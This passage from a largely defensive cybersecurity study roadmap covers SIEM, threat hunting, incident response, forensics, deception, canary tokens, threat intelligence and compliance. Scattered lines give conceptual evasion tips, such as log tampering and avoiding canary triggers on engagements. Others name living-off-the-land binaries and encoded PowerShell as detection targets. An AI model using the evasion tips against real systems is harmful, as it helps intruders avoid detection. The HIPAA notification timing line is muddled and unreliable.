- [ ] **EDR Evasion vs. Detection:** Understand **living-off-the-land techniques EDR detects**, **code injection detection**, **DLL side-loading detection**.

- [ ] **XDR Approach:** Understand how **XDR correlates endpoint, network, cloud, identity signals** for **detection, hunting, response** across domains.

- [ ] **MDR Services:** Know what **Managed Detection & Response (MDR)** providers offer: **24/7 monitoring, incident response, threat hunting, consulting**.

---

<a id="stage-6-soc-siem-fundamentals"></a>
### **Topic 6: SOC & SIEM Fundamentals** — `🔬 Practical`

> [!TIP]
> **Goal:** Understand Security Operations Center workflow and SIEM correlation.

- [ ] **SIEM Basics:** Understand **log aggregation, parsing, normalization, correlation, enrichment** using tools like **Splunk, ELK, ArcSight, QRadar**.

- [ ] **Log Collection:** Know what logs to collect: **Windows Event Logs, Sysmon, firewall logs, proxy logs, DNS logs, authentication logs, application logs**.

- [ ] **Alert Correlation:** Understand **multi-stage detection** (e.g., suspicious logon + process creation + network connection = lateral movement indicator).

- [ ] **SOC Workflow:** Understand **analyst triage → escalation → incident investigation → containment → reporting** process and metrics (MTTD, MTTR).

- [ ] **Dashboard & KPIs:** Know key metrics: **alert volume, MTTD/MTTR, false positive rate, detection coverage %, incident severity distribution**.

- [ ] **SIEM Query Language Fluency:** Compare **SPL (Splunk)**, **KQL (Microsoft Sentinel/Defender)**, and **Lucene/EQL (Elastic/OpenSearch)** syntax for the same detection logic — write the same alert (e.g., "failed logins > 10 in 5 minutes from same source") in all three languages. Maintain a personal cheat sheet mapping equivalent operators across platforms.

> [!IMPORTANT]
> **Stage Gate — Stage 6 (SOC/SIEM):** Before proceeding to Stage 7 (Threat Hunting), you must demonstrate:
> - [ ] Deployed a working SIEM (Splunk Free, Wazuh, ELK, or Security Onion) ingesting logs from at least 3 sources (e.g., Windows Event, Sysmon, Linux auth, DNS)
> - [ ] Written the same alert rule in at least 2 SIEM query languages (SPL, KQL, or Lucene)
> - [ ] Investigated a real alert end-to-end: triage → validate → document → close — without walkthrough assistance
> - [ ] Can name the 5 most important Windows Event IDs for detecting initial access and lateral movement and explain what each one captures

---

<a id="stage-7-threat-hunting-methodology"></a>
### **Topic 7: Threat Hunting Methodology** — `🔬 Practical`

> [!TIP]
> **Goal:** Learn proactive threat hunting to find advanced threats.

- [ ] **Hunting Hypotheses:** Formulate hypotheses based on **MITRE ATT&CK, threat reports, prior compromises** (e.g., "Are scheduled tasks being abused?").

- [ ] **Data Source Selection:** Choose **event logs, network traffic, process telemetry, file integrity monitoring** appropriate for hypothesis.

- [ ] **Query Construction:** Build **SQL, KQL, SPL queries** in SIEM to **search for patterns** (unusual process chains, rare executables, domain queries).

- [ ] **Pivot & Correlate:** Use **results to pivot** (e.g., find account → check all logons → find source IP → check all connections).

- [ ] **Validation & Documentation:** Confirm findings are **actual compromise vs. false positive**, document **timeline, IOCs, and response**.

- [ ] **Jupyter Notebook Threat Hunting:** Mature threat hunting programmes use Jupyter notebooks (JupyterHub or VS Code Jupyter extension) as the primary analysis environment: SIEM or Elasticsearch data pulled via API into pandas DataFrames, statistical anomaly detection with scipy/scikit-learn, and visualisation with matplotlib/seaborn. Reproducible **"hunt books"** — notebooks committed to Git and peer-reviewed — are the production standard at Microsoft MSTIC, Elastic Security Labs, and SANS Hunt teams. Study the [MSTICPy library](https://github.com/microsoft/msticpy) (Microsoft Threat Intelligence Center's open-source hunting library): it provides pre-built connectors for Microsoft Sentinel, Splunk, and QRadar, plus entity enrichment, IOC lookup, and timeline visualisation. Hunt books treat detection logic as code: version-controlled, diff-able, and testable — the same shift-left discipline that CI/CD brought to application code.

---

<a id="stage-8-incident-response-basics"></a>
### **Topic 8: Incident Response Basics** — `🧠🔬 Mixed`

> [!TIP]
> **Goal:** Understand the incident response lifecycle.

- [ ] **Detection & Analysis:** Receive **alert/complaint → triage → determine if real incident → declare incident**.

- [ ] **Containment Strategy:** Short-term: **isolate affected systems**; Long-term: **fix vulnerabilities, update passwords, patch**.

- [ ] **Eradication:** **Remove attacker access** (reset creds, close backdoors, patch exploited systems), verify **persistence mechanisms** removed.

- [ ] **Recovery:** **Restore systems to known good state**, rebuild compromised hosts, verify **no re-infection**.

- [ ] **Lessons Learned:** **Timeline analysis, root cause, detection gaps, improve controls** to prevent recurrence.

- [ ] **Forensic Preservation:** During response, **preserve evidence** (memory dumps, disk images, logs) for **investigation and legal proceedings**.

> [!IMPORTANT]
> **Stage Gate — Stage 8 (Incident Response):** Before proceeding to Stage 9 (Forensics), you must demonstrate:
> - [ ] Produced a structured incident timeline for a simulated incident containing: first indicator, initial compromise, lateral movement, data access/impact, and containment actions — with timestamps and evidence sources for each entry
> - [ ] Written a containment playbook for at least 1 attack scenario (ransomware or credential theft) covering: isolation steps, evidence preservation order, communication contacts, and rollback criteria
> - [ ] Explained the distinction between containment and eradication — and why premature eradication destroys forensic evidence

---

<a id="stage-9-forensic-fundamentals"></a>
### **Topic 9: Forensic Fundamentals** — `🔬 Practical`

> [!TIP]
> **Goal:** Collect and analyze evidence of compromise.

- [ ] **Live Response:** Collect **running processes, network connections, logged-in users, active services** before shutdown (loses volatile data).

- [ ] **Disk Imaging:** Create **bit-for-bit copy** of drives for **offline analysis**, use tools like **dd, Acquire, [FTK Imager](Tools/FTK_Imager.md)**.

- [ ] **Timeline Analysis:** Build **chronological timeline** of **file creation/modification, registry changes, logs** to reconstruct **attack sequence**.

- [ ] **Artifact Examination:** Analyze **Windows Prefetch, Shimcache, MRU, Recycle Bin, browser history, temp files** for **evidence of compromise**.

- [ ] **Memory Analysis:** Use tools like **[Volatility](Tools/Volatility.md), Rekall** to extract **running processes, injected code, encryption keys, command history** from memory dumps.

---

<a id="stage-10-blue-team-evasion-counter-measures"></a>
### **Topic 10: Blue Team Evasion Counter-Measures** — `🧠 Conceptual`

> [!TIP]
> **Goal:** Know how defenders detect and counter red team techniques.

- [ ] **Process Whitelisting:** Defenders use **AppLocker, Device Guard** to allow only **approved executables**; evade via **living-off-the-land** or **trusted paths**.

- [ ] **Memory Protection:** Defenders enable **DEP/NX, ASLR, CET**; understand these reduce **code injection effectiveness**.

- [ ] **Signing Checks:** Defenders verify **code signatures**; exploit **weak validation** or **stolen certificates**.

- [ ] **Logging & Audit:** Defenders enable **command-line logging, PowerShell block logging, Sysmon, ETW**; evade via **log tampering or memory-only payloads**.

- [ ] **Behavioral Blocking:** EDRs use **behavior analysis** to block **suspicious chains** (e.g., Office → PowerShell → network); develop awareness of **detectable patterns**.

- [ ] **Alert Tuning:** Build **low false-positive alerts** for high-confidence indicators (e.g., AMSI evasion, direct syscalls, token theft patterns).

- [ ] **Playbook Development:** Create **runbooks** for common attack patterns (ransomware deployment, credential theft, lateral movement) with **clear triage and containment steps**.

- [ ] **Purple Teaming:** Partner with red teams to **validate detections, test response procedures, and measure MTTD (Mean Time to Detect) and MTTR (Mean Time to Respond)**.

---

**Move-On Gate (Part 13A):** Produce a detection coverage matrix mapped to MITRE ATT&CK tactics covering Stages 1–10.

> [!IMPORTANT]
> **Stage Gate — Stage 10 (Blue Team Counter-Measures):** Before proceeding to Part 13B, you must demonstrate all of:
> - [ ] Identified 3 MITRE ATT&CK techniques that your current lab SIEM would NOT detect and explained why (telemetry gap, logic gap, or tuning issue)
> - [ ] Written 1 detection rule that specifically targets a living-off-the-land technique (PowerShell, certutil, wmic, mshta, or bitsadmin)
> - [ ] Explained how an attacker using only signed Windows binaries would evade your current detection setup — and proposed a countermeasure
> - [ ] Produced a MITRE ATT&CK Navigator layer showing which techniques your lab rules cover (green) and which are uncovered (red)

---

<a id="toc-part-13b-security-operations-expansion"></a>
<a id="part-13b-security-operations-expansion"></a>

---

<a id="side-track-b-ids-firewalls-and-honeypots"></a>
<a id="part-14-ids-firewalls-and-honeypots"></a>

### Side-Track B: IDS, Firewalls, and Honeypots


<a id="stage-1-foundational-strategy-networking"></a>
### **Topic 1: Foundational Strategy & Networking** — `🧠 Conceptual`

> [!TIP]
> **Goal:** Establish the theoretical base and network understanding.

- [ ] **Defense in Depth:** Adopt the `Understand Concept of Defense in Depth` philosophy, using multiple layers of security controls.

- [ ] **Network Segmentation:** Design the network with clear boundaries, utilizing `Perimeter vs DMZ vs Segmentation` to limit blast radius.

- [ ] **Protocol Knowledge:** Master networking fundamentals, including `Understand Handshakes` and identifying `Secure vs Unsecure Protocols`.

---

<a id="stage-2-deploying-firewalls-the-shield"></a>
### **Topic 2: Deploying Firewalls (The Shield)** — `🔬 Practical`

> [!TIP]
> **Goal:** Implement access control and segmentation.

- [ ] **Perimeter Defense:** Deploy a `Firewall & Nextgen Firewall` at the network edge, configuring `ACLs` for ingress and egress filtering.

- [ ] **Endpoint Protection:** Enable and configure `Host Based Firewall` on servers and workstations for granular `Port Blocking`.

- [ ] **Log Analysis:** Set up centralized collection for `Firewall Logs` to monitor policy violations and traffic patterns.

---

<a id="stage-3-implementing-idsips-the-watchers"></a>
### **Topic 3: Implementing IDS/IPS (The Watchers)** — `🔬 Practical`

> [!TIP]
> **Goal:** Detect and stop malicious traffic that bypasses firewalls.

- [ ] **Strategic Deployment:** Place `NIDS` sensors at critical network choke points to monitor east-west and north-south traffic.

- [ ] **Host Monitoring:** Install `HIPS` agents on critical servers to detect suspicious process execution and file changes.

- [ ] **Rule Tuning:** Continuously tune signature and anomaly rules to minimize `False Positives` while ensuring no `False Negatives` occur.

- [ ] **SIEM Integration:** Feed IDS/IPS alerts into a `SIEM` for correlation with other security events.

---

<a id="stage-4-utilizing-deception-the-traps"></a>
### **Topic 4: Utilizing Deception (The Traps)** — `🔬 Practical`

> [!TIP]
> **Goal:** Deploy detection-layer deception that catches attackers operating quietly below IDS thresholds, while understanding how attackers evade it.

- [ ] **Honeypot Deployment:** Deploy `Honeypots` (both low and high interaction) in the DMZ and internal network to attract attackers. Use **Cowrie** (SSH/Telnet), **HoneyD**, or **T-Pot** (multi-protocol stack). Log every interaction and correlate to SIEM.

- [ ] **Traffic Redirection:** Use `Sinkholes` to capture traffic destined for known malicious domains or IPs.

- [ ] **Intelligence Gathering:** Analyze logs and activity from deception tools to inform `Basics and Concepts of Threat Hunting`.

- [ ] **Canary Tokens:** Deploy [canarytokens.org](https://canarytokens.org) tokens across your environment. Understand the three primary token types:
  - **DNS canary tokens** — embed in files/configs; fire on DNS lookup when a file is opened on an internet-connected host
  - **HTTP/URL canary tokens** — embed in documents, email signatures, API docs; fire on HTTP GET when accessed
  - **File-open canary tokens** (Word, PDF, folder) — fire when a document is opened, leaking attacker IP and user-agent
  - Deploy tokens in: fake credentials files, decoy API key configs, unused service accounts, document shares, internal wikis

- [ ] **Canary Token Lab (Hands-On — 10 minutes):** Complete this exercise before reading further:
  1. Go to [canarytokens.org/generate](https://canarytokens.org/generate) and generate a **DNS token**. Enter your email for alerts.
  2. Copy the generated DNS hostname into a file on your lab machine named `aws_credentials.txt` as a fake value: `aws_secret_access_key = AKIA[paste-token-hostname-here]`
  3. Open the file from a terminal (`cat aws_credentials.txt`) — observe whether the DNS token fires. (It will not fire from `cat` alone since no DNS resolution occurs. This is intentional — understand why.)
  4. Now generate an **HTTP token** and embed the URL in a fake config file. Use `curl` to trigger it manually.
  5. Check the canarytokens.org dashboard — observe the activation log showing your IP, user-agent, and timestamp.
  6. **Offensive takeaway:** Knowing token trigger mechanics tells you which file access patterns to avoid on an engagement. A file opened with `cat` does not beacon; a Word document opened in Microsoft Office on an internet-connected host does.
  - Deliverable: screenshot of canary token activation log with attacker IP, user-agent, and timestamp annotated.

- [ ] **Honeyfiles and Honeycredentials:** Plant decoy files that look genuinely valuable to a lateral-moving attacker:
  - `credentials.txt`, `passwords.xlsx`, `backup_keys.txt`, `db_passwords.conf` containing fake but plausible credentials
  - Apply canary tokens inside these files so access is logged
  - Monitor for any use of honeycredentials in authentication logs — use is near-certain evidence of active compromise
  - Place on common share locations (\\\\FILESERVER\\Finance$, \\\\FILESERVER\\IT_Admin$) where attackers enumerate after foothold

- [ ] **Modern Deception Platform Awareness:** Understand enterprise deception platforms beyond basic honeypots:
  - **Attivo Networks / SentinelOne Singularity Identity** — identity-layer deception, fake AD accounts with monitored credentials
  - **Illusive Networks** — network-wide deception fabric with fake endpoints, credentials, and connections seeded across endpoints
  - **Thinkst Canary** — commercial canary token infrastructure with management dashboard and alerting
  - Understand how these platforms differ from honeypots: they blend into the live environment rather than sitting isolated in DMZ

- [ ] **Attacker Evasion of Deception Infrastructure:** Understand what attackers look for to avoid triggering deception:
  - Honeypot fingerprinting: blank/minimal service banners, near-perfect uptime, unusual file timestamps, missing Windows event logs
  - Canary detection: files with atypically recent modification times, identical file sizes, names that are too generic ("passwords.txt")
  - Defenders counter this by making deception assets realistic: age files, add plausible modification history, use actual service banners
  - Understand that even sophisticated attackers who detect some canaries will often trigger others due to deception density

---

<a id="stage-5-operations-continuous-improvement"></a>
### **Topic 5: Operations & Continuous Improvement** — `🧠 Conceptual`

> [!TIP]
> **Goal:** Integrate into daily security operations.

- [ ] **Incident Response Integration:** Utilize these tools during **Incident Response Process** for rapid **threat identification and containment** of affected systems.

- [ ] **Zero Trust Alignment:** Ensure firewall and IPS policies align with **Zero Trust** principles, verifying every connection attempt.

- [ ] **Performance Tuning:** Regularly review and tune **IDS/IPS rules, firewall ACLs** to balance security and performance.

- [ ] **Threat Intelligence Integration:** Feed **IOCs from threat intelligence** into firewalls and IDS for proactive blocking.

- [ ] **Red/Purple Team Testing:** Conduct regular **red team exercises** to validate detection capabilities and identify blind spots.

---

<a id="stage-6-email-security-architecture"></a>
### **Topic 6: Email Security Architecture** — `🔬 Practical`

> [!TIP]
> **Goal:** Secure the #1 initial access vector — email infrastructure.

- [ ] **Email Authentication (SPF/DKIM/DMARC):** Configure **SPF records** (authorized senders), **DKIM signing** (message integrity), and **DMARC policies** (alignment enforcement with p=reject). Validate with **dmarcian, MXToolbox, Google Postmaster**.

- [ ] **Secure Email Gateway (SEG):** Deploy and tune **Proofpoint, Mimecast, Microsoft Defender for Office 365, or open-source alternatives** — configure **anti-spam, anti-phishing, attachment sandboxing, URL rewriting/detonation**.

- [ ] **Anti-Phishing Defenses:** Implement **display name spoofing detection, lookalike domain alerting, external sender banners, impersonation protection policies** targeting executive and financial staff.

- [ ] **Email DLP:** Configure **Data Loss Prevention rules** to detect and block **outbound PII, credentials, source code, financial data** via email attachments and body content.

- [ ] **Mail Flow Architecture:** Understand **MTA (Mail Transfer Agent) routing, MX records, SMTP relay chains, TLS enforcement (DANE/MTA-STS)**, and how mail traverses from sender to recipient.

- [ ] **Email Forensics Awareness:** Understand **email header analysis (Received headers, X-headers, Message-ID tracking)** to trace phishing campaigns and identify spoofed messages.

---

<a id="stage-7-dns-security-operations"></a>
### **Topic 7: DNS Security Operations** — `🔬 Practical`

> [!TIP]
> **Goal:** Detect and prevent DNS-based attacks and data exfiltration.

- [ ] **DNSSEC:** Understand **DNSSEC signing, validation chain, DS/DNSKEY records**, and deployment challenges. Know how DNSSEC prevents **cache poisoning** but does not encrypt queries.

- [ ] **Encrypted DNS (DoH/DoT):** Know that **DNS over HTTPS (DoH, port 443)** and **DNS over TLS (DoT, port 853)** encrypt DNS queries, creating **visibility gaps for network defenders**. Understand how to detect and control encrypted DNS via **endpoint policy, proxy-based inspection, and canary domain monitoring**.

- [ ] **DNS Sinkholing:** Deploy **DNS sinkholes** to redirect known malicious domains (C2, phishing, DGA-generated) to controlled IPs for **detection, containment, and IOC enrichment**.

- [ ] **DNS Firewall (RPZ):** Configure **Response Policy Zones (RPZ)** on internal DNS resolvers to block resolution of **malicious, newly-registered, or DGA-generated domains** based on threat intelligence feeds.

- [ ] **DNS Exfiltration Detection:** Monitor for **high-entropy subdomain queries, unusually long DNS names (>50 chars), high query volumes to single domains, TXT record abuse** indicating **DNS tunneling (iodine, dnscat2)**. Correlate with **SIEM alerts and NetFlow** for confirmation.

- [ ] **Passive DNS Monitoring:** Deploy **passive DNS collection (passivedns, Farsight DNSDB)** to maintain historical resolution records for **threat hunting, domain reputation tracking, and incident response**.

---

<a id="lab-progression-part-14-ids-firewalls-and-honeypots"></a>
### **Lab Progression (Part 14: IDS, Firewalls, and Honeypots)**

| Level | Task | Deliverable |
|-------|------|-------------|
| 1 | Deploy Snort/Suricata IDS in a lab and write 5 custom rules | IDS ruleset + test results |
| 2 | Configure pfSense/iptables firewall with zone-based policies | Firewall architecture diagram + ruleset |
| 3 | Deploy a honeypot (Cowrie, T-Pot, or HoneyD) and analyze attacker behavior | Honeypot analysis report (24-48 hours of data) |
| 4 | Test IDS evasion techniques and tune rules to detect them | Evasion vs. detection comparison report |
| 5 | Build a complete perimeter defense lab (firewall + IDS + honeypot) | Integrated defense architecture document |

> [!IMPORTANT]
> **Move-On Gate:** You can deploy and configure IDS/IPS, write custom detection rules, deploy honeypots for deception, and tune detection to minimize false positives while catching evasion attempts.

<a id="toc-part-15-osint--threat-intelligence"></a>
<a id="part-15-cyber-threat-intelligence-cti-attack-surface-management"></a>
<a id="part-15-osint-threat-intelligence"></a>

---

<a id="side-track-c-cyber-threat-intelligence-cti--attack-surface-management"></a>
<a id="part-15-osint-threat-intelligence"></a>

### Side-Track C: Cyber Threat Intelligence (CTI) & Attack Surface Management


> [!NOTE]
> **Defensive Scope Alignment:** Offensive reconnaissance, active scanning, and target footprinting are covered in **Phase 2 (Part 4)**. Part 15 focuses strictly on defensive **Cyber Threat Intelligence (CTI)**, External Attack Surface Management (EASM), threat actor profiling, and operationalizing intelligence into detection telemetry.

<a id="stage-1-external-attack-surface-management-easm-feeds"></a>
<a id="stage-1-passive-reconnaissance-data-collection"></a>
### **Topic 1: External Attack Surface Management (EASM) & Threat Feeds** — `🔬 Practical`

> [!TIP]
> **Goal:** Monitor and inventory the organization's exposed attack surface from the outside and ingest threat indicator feeds.

- [ ] **Asset Inventory & Shadow IT Discovery:** Map and continuously monitor organizational **ASN ranges, public IP allocations, and registered domains**; identify shadow IT assets and abandoned cloud infrastructure.

- [ ] **Certificate Transparency (CT) Monitoring:** Monitor **Certificate Transparency logs in real-time** (via Certstream) to detect spoofed, typosquatted, or phishing domains newly provisioned against the company brand.

- [ ] **Brand Protection & Typosquatting:** Deploy **dnstwist and urlscan.io** to monitor lookalike domains, credential harvesting portals, and phishing campaigns targeting employees and customers.

- [ ] **Dark Web & Breach Intelligence:** Monitor **paste sites, breach databases (HIBP, Dehashed, Snusbase), and dark web marketplaces** for leaked corporate credentials, compromised API keys, and employee credentials sold in stealer-log packages.

- [ ] **Threat Feed Ingestion:** Ingest and aggregate **reputable CTI feeds** (abuse.ch URLhaus/ThreatFox, AlienVault OTX, CISA Automated Indicator Sharing [AIS], CIRCL) to build an active indicator baseline.

---

<a id="stage-2-threat-intelligence-analysis-actor-profiling"></a>
<a id="stage-2-threat-intelligence-analysis"></a>
### **Topic 2: Threat Intelligence Analysis & Actor Profiling** — `🧠 Conceptual`

> [!TIP]
> **Goal:** Convert raw indicators into actionable threat models and adversary profiles.

- [ ] **IOC vs TTP (The Pyramid of Pain):** Master **David Bianco's Pyramid of Pain** — understand why hash/IP blocking is trivial for adversaries to bypass, while detecting and mitigating **Tools and TTPs** forces high adversary rebuild costs.

- [ ] **The Diamond Model of Intrusion Analysis:** Map attacks across the 4 core vertices: **Adversary, Capability, Infrastructure, and Victim**; correlate relationships between infrastructure and victimology.

- [ ] **Threat Actor Profiling:** Profile **APT groups, cybercrime syndicates, and initial access brokers (IABs)** using **MITRE ATT&CK**, vendor intelligence reports (Mandiant, CrowdStrike, Red Canary), and CISA advisories.

- [ ] **Campaign Tracking & Attribution:** Correlate **command-and-control infrastructure patterns, malware compilation timestamps, code reuse, and staging mechanics** to track evolving threat campaigns.

- [ ] **Strategic, Operational & Tactical CTI:** Distinguish between **Tactical** (atomic IOCs for firewall/SIEM), **Operational** (adversary TTPs for detection engineers), and **Strategic** (high-level risk trends for CISOs and board members).

---

<a id="stage-3-cti-platforms-automation-misp-opencti"></a>
<a id="stage-3-osint-automation-tooling"></a>
### **Topic 3: CTI Platforms & Automation (MISP / OpenCTI)** — `🔬 Practical`

> [!TIP]
> **Goal:** Deploy and operate enterprise threat intelligence platforms to automate indicator ingestion, correlation, and decay.

- [ ] **Threat Intelligence Platform (TIP) Architecture:** Understand the role of TIPs in enterprise SOCs: ingesting disparate feeds, normalizing formats, eliminating duplicates, scoring indicator confidence, and exporting actionable lists to defensive controls.

- [ ] **MISP Platform Operation:** Deploy and operate a [MISP (Malware Information Sharing Platform)](https://www.misp-project.org/) instance. Master the operational mechanics:
  - **Feed management:** Subscribe to and synchronise public MISP feeds (CIRCL default feeds, abuse.ch URLhaus, Botvrij). Understand pull vs. push sync models and feed caching behaviour.
  - **Event creation and sharing:** Create a MISP event from a threat report, populate attributes (IP, domain, hash, YARA rule), set distribution level (Organisation only / Community / All communities), and share via a MISP sync connection or TAXII server.
  - **Indicator enrichment:** Use MISP modules (VirusTotal, Shodan, PassiveTotal, CIRCL HASHLOOKUP) to automatically enrich submitted indicators. Understand enrichment confidence and staleness.
  - **Threat actor tagging:** Apply MITRE ATT&CK Galaxy cluster tags to events and attributes. Tag threat actors (e.g., `misp-galaxy:threat-actor="Lazarus Group"`), malware families (`misp-galaxy:malware="Emotet"`), and attack patterns.
  - **Warninglists and Correlation:** Enable MISP warninglists to suppress false positives (CDN IPs, public resolvers). Understand how MISP's correlation engine links related indicators across events automatically.
  - **MISP → SIEM pipeline:** Export indicators in MISP native format or via its API to your SIEM lookup tables. See Stage 5 for the full pipeline exercise.

- [ ] **OpenCTI Platform:** Deploy **OpenCTI** with Redis, Elasticsearch/OpenSearch, and RabbitMQ to model complex threat knowledge using the **STIX 2.1 graph standard**.

- [ ] **Indicator Decay & Lifecycle Management:** Implement **indicator decay algorithms** — automatically age out and prune volatile IOCs (ephemeral C2 IPs, fast-flux domains) after 30–90 days to prevent SIEM lookup table degradation and stale alert fatigue.

---

<a id="stage-4-threat-intelligence-dissemination"></a>
### **Topic 4: Threat Intelligence Dissemination** — `🧠 Conceptual`

> [!TIP]
> **Goal:** Communicate intelligence effectively to stakeholders.

- [ ] **Intelligence Reports:** Create **tactical (IOCs), operational (TTPs), strategic (trends)** reports for different audiences.

- [ ] **TLP Classification:** Apply **Traffic Light Protocol (White, Green, Amber, Red)** for information sharing sensitivity.

- [ ] **STIX/TAXII:** Use **Structured Threat Information Expression (STIX)** and **TAXII** for standardized intel sharing.

- [ ] **Threat Briefings:** Deliver **executive briefings** highlighting **risks, trends, recommended actions** in non-technical language.

- [ ] **Community Collaboration:** Participate in **ISACs, threat intel communities, CTI sharing platforms** for collective defense.

---

<a id="stage-5-threat-intel-operationalization"></a>
### **Topic 5: Threat Intel Operationalization** — `🔬 Practical`

> [!TIP]
> **Goal:** Close the gap between *collecting* threat intelligence and *acting on it*. A threat report with IOCs and TTPs has zero value if it sits in a PDF. This stage converts intel into SIEM rules, hunting queries, and detection coverage.

- [ ] **IOC → SIEM Pipeline:** Take a published threat report (e.g., [CISA advisories](https://www.cisa.gov/alerts-advisories), [Mandiant APT reports](https://www.mandiant.com/resources/reports), [Sekoia.io blog](https://blog.sekoia.io)) and extract IOCs (IPs, domains, hashes, registry keys, mutexes). Import them into your SIEM/MISP as custom indicators. Write SIEM queries that alert on these IOCs in real-time. Verify the alert fires against test traffic before marking the IOC as operational.

- [ ] **TTP → Detection Rules:** Take a published APT campaign report (e.g., Lazarus Group, Sandworm, APT41). Map 5 TTPs from the report to MITRE ATT&CK technique IDs. For each TTP, write a Sigma rule targeting the log source that would catch the behavior (e.g., T1059.001 PowerShell → process creation log with `powershell.exe -EncodedCommand`). Test each rule in your SIEM by executing the matching behavior in a controlled lab VM. Commit all rules to your Git repository.

- [ ] **Threat Hunting from Intel:** Select one APT report and build a hunting hypothesis: "If this threat actor operated in our environment, what evidence would exist in which log sources?" Build a hunting query for each hypothesis in your SIEM query language (SPL/KQL/EQL). Run the query against your lab data and document: query logic, expected output, actual output, and whether the hunt was productive.

- [ ] **MISP → SIEM Integration:** Configure MISP to automatically push new indicators to your SIEM (via MISP feeds or MISP Warninglists export → SIEM lookup table). Validate that a new IOC added to MISP generates an alert in your SIEM within 15 minutes. This is the core of an automated threat intel pipeline.

- [ ] **Intel-Driven Rule Review:** After writing 10 detection rules over the course of Phase 3, re-review each rule against a new threat report. Ask: "Would this rule catch the TTP described in this report?" If not — update the rule. Detection rule maintenance is as important as rule creation.

> [!IMPORTANT]
> **Operationalization Gate:** You are ready to proceed when you can take a raw APT report, extract structured IOCs, write Sigma rules for 3+ TTPs, import IOCs into your SIEM, verify alerts fire, and run a threat hunt query with documented results. If you can only collect intel but not act on it, you are not yet a threat intelligence practitioner.

---

<a id="lab-progression-part-15-osint-threat-intelligence"></a>
### **Lab Progression (Part 15: OSINT & Threat Intelligence)**

| Level | Task | Deliverable |
|-------|------|-------------|
| 1 | Perform complete OSINT profile of a public figure (using only public data) | OSINT report with sources |
| 2 | Use Shodan/Censys to discover exposed services on a target range | Exposure assessment report |
| 3 | Set up automated threat intelligence feeds (MISP or OpenCTI) | Working TI platform with 3+ feeds |
| 4 | Produce a threat intelligence report on a specific APT group | Structured TI report (TTPs, IOCs, recommendations) |
| 5 | Create STIX-formatted IOCs and share via TAXII server in lab | Working STIX/TAXII demo |
| 6 | Take one APT report → extract IOCs → write 3 Sigma rules → verify they fire in SIEM | Sigma rule set + SIEM alert screenshots |

> [!IMPORTANT]
> **Move-On Gate (Part 15):** You can gather, analyze, and disseminate threat intelligence using industry-standard tools and formats, and produce actionable intelligence reports for both technical and executive audiences. **You must also complete Stage 5 operationalization:** take a raw APT report, extract structured IOCs, import them into your SIEM, write Sigma rules for at least 3 TTPs, verify the alerts fire in your lab, and execute a documented threat hunt query with recorded results. A practitioner who can collect intel but not act on it has not completed this part.


---

<a id="grc-fundamentals-sidebar-early-supplement-for-defensive-careers"></a>
### **GRC Fundamentals Sidebar** _(Early Supplement for Defensive Careers)_

> **Why Here:** SOC analysts, detection engineers, and blue team professionals encounter governance and compliance obligations on Day 1 of employment — not after years of technical specialization. You need to understand what constitutes a reportable incident, what frameworks drive your employer's security program, and how risk language works before you respond to your first real alert. Full GRC depth (audit mechanics, risk quantification, regulatory testing, vendor risk) is in Part 35 (Phase 8). This sidebar gives you the operational minimum.

---

**Stage G1: NIST Cybersecurity Framework (CSF) — Operational Context**

- [ ] **The 5 CSF Functions:** Memorize and internalize the **Identify → Protect → Detect → Respond → Recover** cycle. Understand that every SOC alert and every defensive tool maps to one or more of these functions:
  - **Identify (ID):** Asset inventory, risk assessment, supply chain risk — know what you have before you can protect it
  - **Protect (PR):** Access control, awareness training, data security, maintenance, protective technology
  - **Detect (DE):** Continuous monitoring, anomaly detection, detection processes — this is where SIEM and EDR live
  - **Respond (RS):** Response planning, communications, analysis, mitigation, improvements — your IR playbooks
  - **Recover (RC):** Recovery planning, improvements, communications — restoring operations after an incident

- [ ] **CSF as a Communication Tool:** When your CISO says "we need to improve our Detect posture," they mean improving SIEM coverage, detection rules, and threat hunting. CSF is the language your leadership uses to talk about security investment. Understand it so you can contribute meaningfully to those conversations.

- [ ] **NIST CSF 2.0 (Govern Function):** NIST CSF 2.0 added a 6th function — **Govern (GV)** — covering organizational context, risk strategy, roles, policies, and supply chain risk. This function sits above all others and drives how the other 5 are implemented.

---

**Stage G2: Regulatory Obligations — What Defenders Must Know**

> [!WARNING]
> Failing to meet mandatory breach notification timelines can result in regulatory fines, personal liability for CISOs, and public disclosure. Know these timelines before you respond to your first incident.

- [ ] **GDPR (General Data Protection Regulation — EU):**
  - Applies to any organization processing data of EU residents, regardless of where the org is based
  - **72-hour notification requirement:** Personal data breaches must be reported to the relevant Data Protection Authority within 72 hours of becoming aware — not 72 hours after investigation completion
  - Individual notification required if the breach is "likely to result in a high risk to the rights and freedoms" of affected individuals
  - Maximum fine: €20M or 4% of global annual turnover (whichever is higher)

- [ ] **HIPAA (Health Insurance Portability and Accountability Act — US Healthcare):**
  - Applies to **Covered Entities** (healthcare providers, health plans, clearinghouses) and **Business Associates** (vendors handling PHI)
  - **Protected Health Information (PHI):** Any individually identifiable health information — 18 categories of identifiers
  - **Breach Notification Rule:** Affected individuals must be notified within 60 days of discovery; HHS notification required within 60 days; if >500 individuals affected, media notification required in the affected state; if 500+ individuals, HHS must be notified immediately
  - Minimum Necessary Standard: Access to PHI must be limited to what is necessary for the job function

- [ ] **PCI-DSS (Payment Card Industry Data Security Standard):**
  - Applies to any entity that stores, processes, or transmits cardholder data
  - 12 requirements organized around: network security, access control, vulnerability management, monitoring, information security policy
  - **Penetration testing requirement:** PCI-DSS mandates annual penetration testing (network and application) and testing after significant infrastructure changes — this is why pentesting exists as a compliance service
  - Incident response: Must have a tested IR plan; must notify card brands and acquiring bank immediately upon breach suspicion

- [ ] **Incident Notification Decision Tree:** When responding to a potential breach, apply this sequence:
  1. Is personal data (PII, PHI, payment card data) involved? → Yes → determine scope
  2. What jurisdiction applies? → EU residents = GDPR, US healthcare = HIPAA, payment cards = PCI-DSS
  3. What is the notification timeline for this jurisdiction?
  4. Has the timeline started? (Clock usually starts at "awareness" or "discovery" — not at confirmed impact)
  5. Who is the notification contact? (DPA, HHS, card brands, legal counsel, PR team)

---

**Stage G3: Risk Terminology — The Language of Security Decisions**

- [ ] **Core Risk Equation:** `Risk = Threat × Vulnerability × Impact`
  - **Threat:** A potential cause of harm (e.g., ransomware operators, insider threat, nation-state actors)
  - **Vulnerability:** A weakness that can be exploited (e.g., unpatched CVE, misconfigured S3 bucket, weak password policy)
  - **Impact:** The consequence if exploitation succeeds (e.g., data breach, system unavailability, financial loss, reputational damage)
  - **Likelihood:** How probable is the threat-vulnerability combination being realized? (1–5 scale or qualitative: Low/Medium/High/Critical)

